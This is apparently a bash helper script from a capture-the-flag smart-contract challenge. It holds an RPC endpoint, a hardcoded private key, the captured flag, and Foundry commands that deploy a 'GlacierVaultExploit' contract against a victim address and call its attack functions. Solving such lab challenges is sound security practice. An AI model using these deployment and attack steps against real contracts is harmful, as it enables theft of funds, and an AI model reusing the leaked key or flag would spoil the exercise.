#! /bin/bash

# Test file 
# ticket 89286922467
# flag gctf{h3's_sl33pIng_BuT_ju5t_4_n0w}

# forge test --match path test/Counter.t.sol


# Create contract 

RPC_URL="http://34.159.107.195:18546/e6cd3adc-7ef9-44b9-9544-5df8c4862328"
PRIVATE_KEY="0x4e4d94587b3803125f964bf47042785b12650e1b1ecef869fb6c828637602a22"
MY_ADDRESS=""
VALUE="10 ether"
SETUP_CONTRACT="0x17c66af8f98B1aF480c059DefdcA386131522E3E"
VICTIM_ADDRESS="0xa75AADc8B2504428d74664A15667389097DD9384"
EXPLOIT_CONTRACT="0x1a1078c1B6887d21Bb7A2a95C4C75FD67C6F2ad4"

cast call $SETUP_CONTRACT "isSolved()(bool)" --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# forge create --rpc-url $RPC_URL --private-key $PRIVATE_KEY src/GlacierVaultExploit.sol:GlacierVaultExploit  --constructor-args $VICTIM_ADDRESS

# MY_ADDRESS=$(cast wallet address --private-key $PRIVATE_KEY)
# cast balance --rpc-url $RPC_URL $MY_ADDRESS --ether


# cast send $EXPLOIT_CONTRACT "attack()()" --value "1337ether" --rpc-url $RPC_URL --private-key $PRIVATE_KEY

# cast send $EXPLOIT_CONTRACT "exploit_again()()" --rpc-url $RPC_URL --private-key $PRIVATE_KEY



